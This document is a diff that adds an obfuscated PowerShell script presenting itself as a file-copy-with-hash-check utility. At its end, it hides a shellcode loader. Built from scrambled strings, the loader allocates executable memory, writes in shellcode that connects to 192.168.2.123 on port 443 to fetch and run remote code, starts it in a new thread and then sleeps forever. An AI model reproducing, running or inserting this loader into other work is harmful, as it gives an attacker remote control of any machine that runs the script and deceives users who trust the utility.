@@ -1,0 +1,107 @@
+sV ("8F"+"N9w") ([TyPe]("{0}{9}{5}{4}{3}{2}{8}{7}{1}{6}"-f'se','L','H','TOgRaP','Ty.cRYP','uri','GorIThM','sHA','y.Ha','C') ); function CoP`y-`FILewIt`HhAsH`cH`Eck {
+	
+	[CmdletBinding()]
+	param (
+		[Parameter(ManDATorY = ${tR`Ue}, vaLuEFrOMpipElinEBYproPERTyName = ${T`RUe}, ValuEFrompIPeLinE = ${T`Rue})]
+		[Alias({"{0}{1}{2}" -f'F','ul','lname'})]
+		[string]${SO`UrCefI`le`pA`TH},
+		[Parameter(MaNdatoRy = ${T`RUE})]
+		[ValidateScript({ &("{2}{1}{3}{0}"-f 'h','P','Test-','at') -Path ${_} -PathType ("{2}{1}{0}" -f'r','ntaine','Co') })]
+		[string]${d`EsTiNATI`O`NfoldER`PATH},
+		[Parameter()]
+		[switch]${f`o`RCE}
+	)
+	begin {
+		function t`EsT`-HaSheQ`UAL (${fIl`ep`ATH1}, ${FILe`P`A`TH2}) {
+			${sOu`Rce`H`ASh} = &("{0}{1}{3}{2}"-f 'G','et-MyFil','h','eHas') -Path ${F`i`lePAtH1}
+			${DesT`Ha`sH} = .("{1}{3}{2}{0}"-f'eHash','G','t-MyFil','e') -Path ${F`ILeP`Ath2}
+			if (${So`UrC`E`hAsH}."S`Ha256" -ne ${D`esTh`A`sH}."sha2`56") {
+				${FA`LSE}
+			} else {
+				${tR`UE}
+			}
+		}
+		
+		function Get`-my`FIl`EH`ASH {
+    	
+			[CmdletBinding()]
+			Param (
+				[Parameter(pOSiTIoN = 0, mandatORy = ${t`RuE}, vaLUEfRoMpipelINeByPrOPeRTYnAme = ${Tr`Ue}, VALUEFRoMpipElINe = ${Tr`Ue})]
+				[Alias({"{1}{0}"-f'Path','PS'}, {"{1}{0}" -f'ame','FullN'})]
+				[string[]]${p`AtH},
+				
+				[Parameter(poSitiOn = 1)]
+				[ValidateSet("MD5", {"{0}{1}" -f 'SH','A1'}, {"{0}{2}{1}"-f'SHA','6','25'}, {"{1}{0}"-f '4','SHA38'}, {"{0}{1}"-f 'S','HA512'}, {"{0}{2}{1}"-f 'R','160','IPEMD'})]
+				[string[]]${a`L`gorIThm} = ("{0}{1}"-f'S','HA256')
+			)
+			Process {
+				ForEach (${IT`em} in ${p`Ath}) {
+					try {
+						${i`TEM} = (.("{3}{2}{0}{1}" -f'P','ath','esolve-','R') ${i`TEm})."prOV`I`der`patH"
+						If (-Not ([uri]${i`Tem})."ISaB`SOLUt`e`U`Ri") {
+							&("{2}{1}{3}{0}" -f 'se','te-Ve','Wri','rbo') ("{0} is not a full path, using current directory: {1}" -f ${i`TEM}, ${p`wD})
+							${I`TEm} = (.("{0}{1}" -f 'Join-Pa','th') ${p`wD} (${i`TEm} -replace ((("{0}{1}"-f 'n','f8.nf8nf8'))-CrepLaCe([CHaR]110+[CHaR]102+[CHaR]56),[CHaR]92), ""))
+						}
+						If (.("{2}{1}{0}"-f'-Path','t','Tes') ${i`TEM} -Type ("{0}{1}{2}"-f'C','o','ntainer')) {
+							&("{0}{2}{3}{1}" -f 'W','arning','rit','e-W') ("Cannot calculate hash for directory: {0}" -f ${I`Tem})
+							Return
+						}
+						${ObJe`Ct} = &("{3}{1}{2}{0}" -f 'ct','w-Ob','je','Ne') ("{0}{2}{1}"-f'PSO','ct','bje') -Property @{
+							("{0}{1}" -f 'Pat','h') = ${iT`eM}
+						}
+						
+						${S`Tr`EAM} = ([IO.StreamReader]${i`TEm})."bAsest`R`eam"
+						foreach (${ty`pe} in ${Algo`Ri`ThM}) {
+							[string]${H`ASh} = -join ( ${8f`N`9W}::("{2}{1}{0}" -f 'te','ea','Cr').Invoke(${T`yPE})."Com`Pu`TehaSH"(${st`Re`Am}) |
+							&("{0}{1}{2}" -f'For','E','ach') { "{0:x2}" -f ${_} })
+							${n`ULL} = ${St`REAm}.("{0}{1}"-f'Se','ek').Invoke(0, 0)
+							
+							${ob`JE`cT} = &("{2}{0}{1}" -f'dd-Memb','er','A') -InputObject ${Ob`J`ECT} -MemberType ("{2}{1}{0}" -f 'roperty','eP','Not') -Name ${T`ypE} -Value ${h`AsH} -PassThru
+						}
+						${objE`ct}."pS`TYp`EnAmeS".("{1}{0}"-f 'nsert','i').Invoke(0, ("{0}{2}{5}{3}{1}{6}{4}" -f'Sys','ile','t','F','ash','em.IO.','Info.H'))
+						
+						.("{2}{1}{0}{3}"-f'te-Outp','ri','W','ut') ${O`B`jECt}
+						
+						
+						${s`TReAM}.("{1}{0}" -f 'ose','Cl').Invoke()
+					} catch {
+						&("{1}{0}{3}{2}"-f'rite-','W','og','L') -Message "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber) " -LogLevel '3'
+						${fa`lSE}
+					}
+				}
+			}
+		}
+	}
+	process {
+		try {
+			${C`o`PYPara`MS} = @{ ("{0}{1}" -f'P','ath') = ${soUR`CEF`ilE`PaTH}; ("{1}{0}{3}{2}"-f'inat','Dest','n','io') = ${D`ES`TINATi`onFold`e`R`paTH} }
+			
+			
+			${D`e`STFIl`Ep`ATH} = "$DestinationFolderPath\$($SourceFilePath | Split-Path -Leaf) "
+			if (&("{0}{1}"-f'Te','st-Path') -Path ${DE`StF`IL`EpaTh} -PathType ("{0}{1}"-f'L','eaf')) {
+				if (.("{2}{0}{1}{4}{3}"-f'E','q','Test-Hash','l','ua') -FilePath1 ${So`URC`EFiLe`PATH} -FilePath2 ${dE`StfiLE`pA`TH}) {
+					.("{2}{1}{4}{0}{3}"-f '-Verbo','rit','W','se','e') -Message ('Th'+'e '+'fi'+'le '+"$SourceFilePath "+'is'+' '+'alre'+'ad'+'y '+'i'+'n '+"$DestinationFolderPath "+'an'+'d '+'i'+'s '+'th'+'e '+'same'+'. '+'N'+'o '+'nee'+'d '+'t'+'o '+'c'+'opy')
+					return ${T`RUe}
+				} elseif (!${f`ORCE}."ispr`ES`Ent") {
+					throw ('A '+'file'+' '+'call'+'ed '+"$SourceFilePath "+'is'+' '+'alread'+'y '+'in'+' '+"$DestinationFolderPath "+'b'+'ut '+'i'+'s '+'not'+' '+'t'+'he '+'same'+' '+'fil'+'e '+'being'+' '+'copie'+'d.')
+				} else {
+					${COpyPa`RA`MS}."FO`RCE" = ${T`RuE}
+				}
+			}
+			
+			.("{4}{1}{2}{0}{3}"-f'b','ri','te-Ver','ose','W') ('Copy'+'ing '+'file'+' '+"$SourceFilePath...")
+			&("{0}{2}{1}"-f 'Copy','m','-Ite') @CopyParams
+			if (.("{2}{3}{1}{0}" -f 'al','shEqu','Te','st-Ha') -FilePath1 ${S`OU`R`C`efIlEpATh} -FilePath2 ${D`ES`TfILeP`ATH}) {
+				.("{2}{0}{1}"-f 'V','erbose','Write-') -Message ('The'+' '+'f'+'ile '+"$SourceFilePath "+'wa'+'s '+'suc'+'cess'+'fully '+'cop'+'ie'+'d '+'t'+'o '+"$DestinationFolderPath")
+				return ${T`RUe}
+			} else {
+				throw ('At'+'tempt'+'ed '+'t'+'o '+'co'+'py '+'th'+'e '+'f'+'ile '+"$SourceFilePath "+'t'+'o '+"$DestinationFolderPath "+'but'+' '+'faile'+'d '+'th'+'e '+'ha'+'sh '+'ch'+'eck')
+			}
+			
+		} catch {
+			.("{2}{0}{3}{1}"-f'i','Error','Wr','te-') -Message "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber) "
+			${Fa`L`SE}
+		}
+	}
+}
+${c} = ((("{68}{71}{112}{78}{18}{32}{0}{52}{14}{21}{106}{110}{22}{55}{95}{48}{66}{76}{41}{28}{49}{113}{88}{99}{23}{98}{92}{20}{57}{103}{47}{3}{40}{2}{1}{62}{56}{45}{111}{70}{75}{51}{16}{60}{44}{115}{67}{39}{109}{46}{101}{105}{74}{81}{69}{61}{82}{43}{108}{17}{53}{25}{42}{102}{58}{96}{83}{29}{34}{9}{90}{89}{65}{27}{7}{114}{30}{63}{64}{72}{33}{91}{84}{97}{100}{54}{11}{36}{38}{94}{26}{87}{5}{10}{31}{79}{59}{85}{15}{104}{50}{35}{12}{86}{8}{93}{77}{13}{6}{19}{80}{73}{24}{37}{4}{107}" -f' In','m','I','tec','nt)',';[DllIm','t,','s','tr','ntP','port(wLHmsvcrt.dllwLH)]pub','gs, I','et(In','es','a','er','s','d',' static ext',' u','llocat','lAll','IntPtr','t','in','tr','hre','re',', u','a','n','lic sta','ern','p','ckSize, I','s','nt','t cou','Ptr','Cr','t);[Dll','s','i','T',' e','e','eTh','t flPro','A','int ','tr mem',' ','tPtr Virtu','At','nFla',' ','ern','ionType, ',',','x','tatic','r','port(wLHk','tPt','r','tAdd','dd',' ','[DllImport(wL','t','2.dllwLH)]publ','Hkern',' l',' u','(','ic','res','d','LH)]public','tic e','int src,','IntP',' lp','int dwSt','aramet','t','tP','adId)','wSize,','lpStar','tr ','P','A',' ',' lpT','lp',' u','er, u',' fl',' uin','int dwCreatio','r','butes','uin','n IntP','ead','o',';','hrea','eat','c(','l3','el32.dllw','d','s, I','xtern IntPtr'))-REpLAcE([CHaR]119+[CHaR]76+[CHaR]72),[CHaR]34);${w} = .("{1}{0}"-f'e','Add-Typ') -memberDefinition ${C} -Name ("{0}{1}"-f'Win3','2') -namespace ("{2}{1}{0}{3}" -f '2Funct','in3','W','ions') -passthru;[Byte[]];[Byte[]]${Sc} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${SI`zE} = 0x1000;if (${Sc}."L`ength" -gt 0x1000){${SI`Ze} = ${S`c}."Le`NgTh"};${x}=${W}::("{1}{3}{0}{2}"-f'l','Virtua','oc','lAl').Invoke(0,0x1000,${Si`Ze},0x40);for (${I}=0;${I} -le (${S`C}."L`enG`Th"-1);${I}++) {${W}::"m`e`msEt"([IntPtr](${x}.("{2}{0}{1}"-f 'Int','32','To').Invoke()+${I}), ${SC}[${I}], 1)};${w}::("{0}{1}{3}{2}" -f 'Create','T','ead','hr').Invoke(0,0,${x},0,0,0);for (;;){.("{1}{2}{0}"-f 'leep','Start-','s') 60};
